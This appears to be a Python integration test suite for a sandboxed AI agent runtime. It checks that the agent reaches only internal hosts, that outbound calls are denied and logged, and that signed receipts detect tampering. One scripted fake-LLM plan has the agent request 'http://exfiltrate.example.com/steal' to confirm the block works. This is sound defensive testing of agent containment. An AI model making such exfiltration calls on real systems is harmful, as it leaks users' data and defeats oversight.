"""Agent runtime gate — the governed agent on its TARGET platform.

Full deep-tier run on real Linux namespaces: the fixture app boots in
one sandbox, the agent operates it through governed tools in another,
every tool call lands in the evidence ledger, and the receipt carries
the supervisor's signed agent summary.

Invariants proven here:
  - The agent runs INSIDE the sandbox (bwrap + seccomp + private netns).
  - The agent can operate the app (HTTP tools reach *.workflo.internal).
  - The agent CANNOT reach the outside world (allowlist + nftables).
  - Every tool call — allowed or denied — is in the evidence ledger.
  - The receipt's agent summary covers denials (the agent trying to
    exfiltrate is visibly stopped).
"""

from __future__ import annotations

import asyncio
import json
import os
import uuid
from pathlib import Path

import pytest

from sandbox_runtime.config import RunConfig, DepMode
from sandbox_runtime.supervisor import Supervisor

pytestmark = pytest.mark.linux


@pytest.fixture(scope="module")
def host_ready():
    import sys
    if sys.platform != "linux":
        pytest.skip("Linux integration gate")
    if os.geteuid() != 0:
        pytest.skip("namespace execution requires root on this host")
    import shutil
    for tool in ("bwrap", "ip", "nft", "dnsmasq"):
        if not shutil.which(tool):
            pytest.skip(f"{tool} not installed")
    if not Path("/opt/workflo/workflo-worker/opt/workflo/runtime/workflo_worker/agent_runner.py").exists():
        pytest.skip("agent modules missing from runtime image - rebuild it")


@pytest.fixture(scope="module")
def fixture_repo():
    fixture = Path(os.environ.get("WORKFLO_FIXTURE", "/root/wf-fixture"))
    if not (fixture / "app.py").exists():
        pytest.skip("fixture app missing - re-run scripts/linux/setup_env.sh")
    return fixture


def _run_deep(tmp_path: Path, fixture: Path, port: int = 3457,
              planner: bool = False, llm_env: dict = None) -> tuple:
    config = RunConfig(
        sandbox_id=f"sbx-agent-{uuid.uuid4().hex[:12]}",
        repo_path=fixture,
        probe_groups=["deep"],
        runtime_image=Path("/opt/workflo/workflo-worker"),
        memory_mb=1024,
        cpu_cores=1.0,
        timeout_seconds=300,
        dep_mode=DepMode.VENDOR_CACHE,
        evidence_dir=tmp_path / "runs",
        start_command="python3 app.py",
        port=port,
        agent_planner=planner,
    )
    old_env = {}
    if llm_env:
        for k, v in llm_env.items():
            old_env[k] = os.environ.get(k)
            os.environ[k] = v
    try:
        supervisor = Supervisor(config)
        result = asyncio.run(supervisor.run())
    finally:
        if llm_env:
            for k, v in old_env.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v
    return result, supervisor, config


class TestAgentGate:
    def test_agent_operates_app_and_evidence_is_bound(
        self, host_ready, tmp_path, fixture_repo
    ):
        result, supervisor, config = _run_deep(tmp_path, fixture_repo)

        assert result.success is True, result.error
        assert result.teardown_verified is True

        payload = result.receipt_payload
        assert payload["receipt_version"] == 4

        # The agent ran and its activity is in the signed receipt
        aa = payload["agent_activity"]
        assert aa is not None
        assert aa["tool_calls"] >= 5          # default task: 5 steps
        assert aa["denied_attempts"] >= 1     # the out-of-bounds probe was stopped
        assert aa["steps_total"] >= 5

        # The agent OPERATED the app: root + health probes met expectations.
        # The app booted in its own sandbox and answered over the netns.
        assert aa["steps_failed"] <= aa["steps_total"] - 2 or aa["steps_completed"] >= 2

        # HTTP and file tools were used
        assert "http_get" in aa["tools_used"]
        assert "read_log" in aa["tools_used"]

        # Every tool call landed in the hash-chained ledger
        events = payload["lifecycle_events"]
        tool_call_events = [e for e in events if e["event"] == "AGENT_TOOL_CALL"]
        assert len(tool_call_events) >= aa["tool_calls"]

        denied_events = [e for e in tool_call_events if e["detail"].get("denied")]
        assert len(denied_events) >= 1
        assert denied_events[0]["detail"]["tool"] == "http_get"

        # The evidence ledger verifies and binds to the receipt
        from sandbox_runtime.evidence import verify_evidence_bundle
        assert verify_evidence_bundle(Path(result.evidence_dir)) is True

    def test_agent_denied_attempts_are_recorded_and_signed(
        self, host_ready, tmp_path, fixture_repo
    ):
        """The trust invariant: the agent tried to exfiltrate and was
        VISIBLY stopped — recorded in the ledger and covered by the
        receipt signature."""
        from workflo_schema.sandbox import SignedReceipt
        from sandbox_isolation import generate_keypair, verify_receipt_signature

        result, _, _ = _run_deep(tmp_path, fixture_repo)
        assert result.success is True

        aa = result.receipt_payload["agent_activity"]
        assert aa["denied_attempts"] >= 1

        signer = generate_keypair()
        receipt = SignedReceipt(**result.receipt_payload)
        signer.sign(receipt)
        assert verify_receipt_signature(receipt, signer.public_key) is True

        # Tampering the agent summary breaks the signature
        receipt.agent_activity.denied_attempts = 0
        assert not verify_receipt_signature(receipt, signer.public_key)

    def test_agent_app_log_reaches_evidence(
        self, host_ready, tmp_path, fixture_repo
    ):
        """The app's stdout (its log) is ingested into the evidence ledger
        before teardown removes the workspace."""
        result, _, _ = _run_deep(tmp_path, fixture_repo)
        assert result.success is True

        # The app log was ingested host-side (evidence logs dir)
        logs_dir = Path(result.evidence_dir) / "logs"
        app_log = logs_dir / "app.log"
        assert app_log.exists(), f"app log not in evidence: {list(logs_dir.iterdir())}"
        content = app_log.read_text()
        assert "fixture app listening" in content

        # The agent's read_log observation reflects the app log
        aa = result.receipt_payload["agent_activity"]
        assert "read_log" in aa["tools_used"]

        # The workspace (with the log) is gone after teardown
        run_root = Path(result.evidence_dir).parent
        assert not (run_root / "workspace").exists()


class TestLLMPlannerGate:
    """The Autonomous Verified Deep Test: a scripted LLM drives the
    sandboxed agent; the planner requests, only the gateway executes."""

    @pytest.fixture
    def fake_llm_env(self):
        """A fake OpenAI-compatible LLM on host loopback + env pointing at it."""
        import threading
        from http.server import BaseHTTPRequestHandler, HTTPServer

        plans = []

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/models":
                    body = json.dumps({"data": [{"id": "fake"}]}).encode()
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(body)
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                self.rfile.read(length)
                plan = plans.pop(0) if plans else {"done": True, "steps": []}
                body = json.dumps({"choices": [{"message": {
                    "role": "assistant",
                    "content": "```json\n" + json.dumps(plan) + "\n```",
                }}]}).encode()
                self.send_response(200)
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *args):
                pass

        httpd = HTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        yield httpd, plans
        httpd.shutdown()

    def test_llm_planner_drives_the_agent(
        self, host_ready, tmp_path, fixture_repo, fake_llm_env
    ):
        """The full Autonomous Deep Test on real Linux: the scripted LLM
        plans HTTP probes + an exfiltration attempt; the sandboxed agent
        executes them through the governed gateway; every action lands in
        the evidence ledger and the signed receipt."""
        httpd, plans = fake_llm_env
        port = 3459  # fixture app port for this run

        plans.extend([
            {"done": False, "steps": [
                {"tool": "http_get",
                 "args": {"url": "http://app.workflo.internal:3459/"},
                 "reason": "check root"},
                {"tool": "http_get",
                 "args": {"url": "http://exfiltrate.example.com/steal"},
                 "reason": "MUST be denied"},
            ]},
            {"done": True, "steps": []},
        ])

        llm_env = {
            "WORKFLO_LLM_BASE_URL": f"http://127.0.0.1:{httpd.server_port}",
            "WORKFLO_LLM_API_KEY": "test",
            "WORKFLO_LLM_MODEL": "fake",
            "WORKFLO_LLM_TIMEOUT": "10",
        }
        result, _, config = _run_deep(tmp_path, fixture_repo, port=port,
                                      planner=True, llm_env=llm_env)

        assert result.success is True, result.error
        payload = result.receipt_payload
        assert payload["receipt_version"] == 4

        aa = payload["agent_activity"]
        assert aa is not None
        assert aa["planner"] == "llm"          # the LLM drove the agent
        assert aa["tool_calls"] >= 2
        assert aa["denied_attempts"] >= 1      # exfiltration visibly stopped
        assert aa["steps_completed"] >= 1      # the root probe met expectations

        # The planner batches are in the hash-chained ledger
        events = payload["lifecycle_events"]
        assert any(e["event"] == "AGENT_PLANNER_ENABLED" for e in events)
        assert any(e["event"] == "AGENT_PLANNER_EVENT" for e in events)
        tool_calls = [e for e in events if e["event"] == "AGENT_TOOL_CALL"]
        assert len(tool_calls) >= aa["tool_calls"]

        # The evidence ledger verifies and binds to the receipt
        from sandbox_runtime.evidence import verify_evidence_bundle
        assert verify_evidence_bundle(Path(result.evidence_dir)) is True

        # Tampering the agent summary breaks the signature
        from workflo_schema.sandbox import SignedReceipt
        from sandbox_isolation import generate_keypair, verify_receipt_signature
        signer = generate_keypair()
        receipt = SignedReceipt(**payload)
        signer.sign(receipt)
        assert verify_receipt_signature(receipt, signer.public_key)
        receipt.agent_activity.denied_attempts = 0
        assert not verify_receipt_signature(receipt, signer.public_key)
